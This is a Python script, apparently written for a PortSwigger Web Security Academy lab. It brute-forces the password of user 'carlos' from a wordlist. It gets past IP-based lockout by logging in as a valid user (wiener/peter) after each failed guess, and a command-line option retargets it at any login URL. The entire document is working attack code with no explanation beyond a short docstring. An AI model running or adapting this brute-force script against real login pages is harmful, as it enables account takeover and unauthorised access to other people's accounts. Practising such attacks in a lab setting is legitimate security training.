"""
This script bypasses the IP blocking by logging in every 2nd attempt as a valid user.

Example: Bruteforce user "carlos" with given password list.
1) Try to login as carlos with a password 
2) Login as a valid user (peter/wiener)
3) Try to login as carlos and so on.
"""

#!/usr/bin/env python3
import re
import requests
import sys
import argparse

#initialisation of variables
host = 'https://ac0d1f9e1ebad1bb803f937100650030.web-security-academy.net'
login_url = host + '/login'
logout_url = host + '/logout'
username = 'carlos'
wordlist = []
filePath = "/home/kali/auth/lab_passwords.txt" # home/kali/Documents/pwk_lp1/mutated2.txt

def loginUser(username, password, session):
    login_page = session.get(login_url)    

    dataCorrect = {
        'username': username,
        'password': password
    }
    
    login_result = session.post(login_url, data = dataCorrect, allow_redirects = True)
    return login_result 

# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="set target url")
parser.add_argument("--file", "-f", help="set passwords file")
args = parser.parse_args()

# Check args
if args.url:
    print("Set full url to " + args.url)
    login_url = args.url
    
if args.file:
    print("Set file to " + args.file)
    filePath = args.file

# Parsing words out of file 
f=open(filePath,"r")
lines=f.readlines()

# Generate passwords our of file
for pw in lines:
    wordlist.append(pw)
f.close()

i = 1
# iterating over passwords
for password in wordlist:
    session = requests.Session()
    #session.proxies={'http': 'https://localhost:8080'}

    password = password.rstrip()
    print('[*] Trying pw: "{p}"'.format(p = password))
    
    if i % 2 == 0:
        #login as valid user
        loginUser('wiener', 'peter', session)
        #logout
        session.get(logout_url, allow_redirects = True)
        #try bruteforcing
        res = loginUser(username, password, session)
        if '<a href="/logout">Log out</a>' in res.text: 
            print("********PASSWORD FOUND: " + username + "/" + password)
            sys.exit()
    else:
        res = loginUser(username, password, session)
        if '<a href="/logout">Log out</a>' in res.text: 
            print("PASSWORD FOUND: " + username + "/" + password)
            sys.exit()
    i = i + 1
